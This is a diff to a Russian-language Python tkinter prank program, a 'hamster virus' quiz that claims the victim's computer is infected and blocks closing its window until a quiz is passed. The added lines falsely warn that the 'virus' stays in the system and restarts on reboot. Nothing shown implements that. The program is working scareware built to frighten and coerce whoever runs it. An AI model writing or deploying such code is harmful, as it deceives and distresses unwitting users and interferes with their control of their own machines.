@@ -1,4 +1,4 @@
-# hamster_quiz.py - ПОЛНАЯ РАБОЧАЯ ВИКТОРИНА
+# hamster_quiz.py - ВИКТОРИНА С СОХРАНЕНИЕМ СТАТУСА
 import tkinter as tk
 from tkinter import messagebox
 import json
@@ -8,11 +8,13 @@ from pathlib import Path
 STATUS_FILE = Path(os.getenv('APPDATA')) / "hamster_unlock.json"
 
 def mark_test_passed():
+    """Сохраняет факт прохождения теста"""
     try:
         with open(STATUS_FILE, 'w') as f:
             json.dump({"passed": True}, f)
+        return True
     except:
-        pass
+        return False
 
 # Вопросы
 questions = [
@@ -29,10 +31,12 @@ root = None
 option_btns = []
 
 def on_closing():
-    """Блокирует закрытие окна"""
+    """Блокирует закрытие окна до прохождения теста"""
     messagebox.showwarning("⚠ ЗАКРЫТЬ НЕЛЬЗЯ ⚠", 
                           "Ты не можешь закрыть окно!\n"
-                          "Пройди тест до конца, чтобы разблокировать компьютер.")
+                          "Пройди тест до конца, чтобы разблокировать компьютер.\n\n"
+                          "Если закроешь сейчас - вирус останется в системе\n"
+                          "и запустится снова при перезагрузке!")
 
 def check_answer(idx):
     global score, current
@@ -82,6 +86,7 @@ def end_test():
     root.configure(bg='#1a3d1a')
     
     if percent >= 80:
+        # СОХРАНЯЕМ, ЧТО ТЕСТ ПРОЙДЕН
         mark_test_passed()
         
         tk.Label(root, text="🎉 ПОЗДРАВЛЯЮ! 🎉", 
@@ -90,17 +95,24 @@ def end_test():
         tk.Label(root, text=f"Результат: {score} из {len(questions)} ({int(percent)}%)",
                 font=("Arial", 14), bg='#1a3d1a', fg='white').pack()
         
-        tk.Label(root, text="\nВирус уничтожен! Компьютер разблокирован.",
-                font=("Arial", 12), bg='#1a3d1a', fg='lightgreen').pack(pady=20)
+        tk.Label(root, text="\n✅ Вирус уничтожен! Компьютер разблокирован.\n"
+                "Теперь можно закрыть окно. Вирус больше не запустится при перезагрузке.",
+                font=("Arial", 11), bg='#1a3d1a', fg='lightgreen', justify='center').pack(pady=20)
+        
+        # Разрешаем закрыть окно
+        root.protocol("WM_DELETE_WINDOW", root.destroy)
         
         tk.Button(root, text="✨ ВЫЙТИ ✨", font=("Arial", 12, "bold"),
                  bg='green', fg='white', padx=30, pady=10, command=root.destroy).pack(pady=30)
     else:
+        # НЕ ПРОШЁЛ - НЕ СОХРАНЯЕМ СТАТУС
         tk.Label(root, text="😭 ТЕСТ НЕ СДАН! 😭", 
                 font=("Arial", 18, "bold"), bg='#1a3d1a', fg='red').pack(pady=30)
         
         tk.Label(root, text=f"Результат: {score} из {len(questions)} ({int(percent)}%)\n"
                 "Нужно 80% (4 из 5) для разблокировки.\n\n"
+                "⚠️ ВИРУС ОСТАЁТСЯ В СИСТЕМЕ! ⚠️\n"
+                "При перезагрузке компьютера вирус запустится снова.\n\n"
                 "Нажми кнопку, чтобы пройти тест заново.",
                 font=("Arial", 11), bg='#1a3d1a', fg='yellow', justify='center').pack(pady=20)
         
@@ -120,7 +132,7 @@ def show_hamster_test():
     
     root = tk.Tk()
     root.title("🐹 ВИРУС-ХОМЯК 🐹")
-    root.geometry("600x550")
+    root.geometry("600x600")
     root.configure(bg='#2d2d2d')
     root.resizable(False, False)
     
@@ -130,7 +142,9 @@ def show_hamster_test():
     tk.Label(root, text="🤣 ХА-ХА-ХА! ТЫ ПОПАЛСЯ! 🤣", 
             font=("Arial", 18, "bold"), bg='#2d2d2d', fg='red').pack(pady=15)
     
-    tk.Label(root, text="Твой компьютер заражён!\nПройди тест о хомяках, чтобы разблокировать.",
+    tk.Label(root, text="Твой компьютер заражён вирусом-хомяком!\n"
+            "Пройди тест, чтобы разблокировать компьютер.\n"
+            "Если закроешь сейчас - вирус останется в системе!",
             font=("Arial", 11), bg='#2d2d2d', fg='white', justify='center').pack()
     
     frame = tk.Frame(root, bg='#3d3d3d', relief='ridge', bd=2)
@@ -159,8 +173,9 @@ def show_hamster_test():
     progress = tk.Label(root, text="", bg='#2d2d2d', fg='gray', font=("Arial", 9))
     progress.pack(pady=5)
     
-    tk.Label(root, text="⚠ НЕ ПЫТАЙСЯ ЗАКРЫТЬ ОКНО! ⚠", 
-            font=("Arial", 9, "bold"), bg='#2d2d2d', fg='red').pack(pady=10)
+    tk.Label(root, text="⚠ НЕ ПЫТАЙСЯ ЗАКРЫТЬ ОКНО! ⚠\n"
+            "При перезагрузке вирус запустится снова, пока не пройдёшь тест!", 
+            font=("Arial", 9, "bold"), bg='#2d2d2d', fg='red', justify='center').pack(pady=10)
     
     update_question()
     root.mainloop()
